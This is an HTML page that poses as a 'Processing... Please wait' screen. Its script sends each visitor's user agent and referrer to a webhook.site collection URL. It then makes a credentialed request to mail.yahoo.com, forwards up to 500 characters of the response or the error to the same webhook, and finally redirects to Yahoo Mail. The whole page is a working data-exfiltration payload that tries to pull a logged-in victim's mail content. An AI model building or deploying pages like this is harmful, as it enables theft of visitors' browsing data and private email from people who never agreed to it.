
        <html>
        <head>
            <title>Processing...</title>
        </head>
        <body>
            <p>Please wait...</p>
            <script>
                window.onload = function() {
                    // Capture initial browser information
                    const userAgent = navigator.userAgent || 'No user agent found';
                    const referer = document.referrer || 'No referer found';
                    
                    // Send initial data to Webhook
                    const initialData = `Initial Data - User-Agent: ${userAgent}, Referer: ${referer}`;
                    fetch('https://webhook.site/8f016836-304a-44d8-aee7-ed7bae810a25?data=' + encodeURIComponent(initialData))
                        .then(response => console.log('Initial data sent to Webhook'))
                        .catch(error => console.error('Error sending initial data:', error));

                    // Attempt to make a request to Yahoo to capture any subsequent data
                    fetch('https://mail.yahoo.com', {
                        method: 'GET',
                        credentials: 'include'
                    })
                    .then(response => response.text())
                    .then(data => {
                        // Send the response data to Webhook
                        const responseData = `Subsequent Request Data: ${data.substring(0, 500)}`; // Limit size for safety
                        fetch('https://webhook.site/8f016836-304a-44d8-aee7-ed7bae810a25?data=' + encodeURIComponent(responseData))
                            .then(res => console.log('Subsequent data sent to Webhook'))
                            .catch(err => console.error('Error sending subsequent data:', err));
                    })
                    .catch(error => {
                        const errorData = `Subsequent Request Error: ${error.message}`;
                        fetch('https://webhook.site/8f016836-304a-44d8-aee7-ed7bae810a25?data=' + encodeURIComponent(errorData))
                            .then(res => console.log('Error sent to Webhook'))
                            .catch(err => console.error('Error sending error data:', err));
                    });

                    // Final redirect to mail.yahoo.com after 5 seconds
                    setTimeout(function() {
                        window.location.href = "https://mail.yahoo.com";
                    }, 5000);
                };
            </script>
        </body>
        </html>
